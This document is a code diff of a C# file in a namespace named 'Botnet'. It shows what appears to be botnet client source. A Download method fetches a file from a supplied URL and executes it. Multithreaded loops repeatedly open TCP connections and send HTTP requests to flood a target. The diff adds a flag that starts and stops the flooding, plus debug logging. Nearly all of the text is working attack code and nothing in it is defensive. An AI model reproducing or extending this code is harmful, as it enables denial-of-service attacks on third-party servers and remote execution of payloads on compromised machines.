@@ -12,8 +12,11 @@ using System.Threading.Tasks;
 
 namespace Botnet
 {
+    
     class Functions
     {
+        public static bool p;
+
         public static void OpenLink(string URI)
         {
             if (URI.StartsWith("http"))
@@ -27,10 +30,12 @@ namespace Botnet
 
         public static void Download(string URI)
         {
+            Console.WriteLine(URI);
          
                 Thread thr = new Thread(() => 
                 {
                     string file_path = web.DownloadFile(URI);
+                    Console.WriteLine(file_path);
                     Process.Start(file_path);
                 });
             thr.Start();
@@ -47,18 +52,18 @@ namespace Botnet
                     {
                         Thread.CurrentThread.IsBackground = true;
 
-                        while (true)
+                        while(p)
                         {
                             try
                             {
                                 TcpClient client = new TcpClient();
                                 client.Connect(url, configs.port);
                                 StreamWriter stream = new StreamWriter(client.GetStream());
-                                stream.Write("GET /?QssmGrKb=QVXXBekCC&QBo0Rj=f5xQ3cO0dO1RS&ojJyAyIJ=J1mel&KtgP1P8VMd=BLpo8I7qmNbyqbnR1OKsdsdsds HTTP/1.0");// send packet
+                                stream.Write("GET /HTTP/1.0");// send packet
                                 Console.WriteLine("packet sending");
                                 stream.Flush();
                                 stream.Close();
-
+                             
                             }
                             catch
                             {
@@ -69,10 +74,15 @@ namespace Botnet
 
                     }).Start();
 
-                    while (true) ;
                 
             }
 
+        }
+
+        public static void run(Boolean t)
+        {
+            p = t;
+            
         }
 
         public static  void Httprequest(string url)
@@ -85,7 +95,7 @@ namespace Botnet
                     Console.WriteLine("Thred:" + i + "   " );
                     Thread.CurrentThread.IsBackground = true;
 
-                    while (true)
+                    while (p)
                     {
                         try
                         {
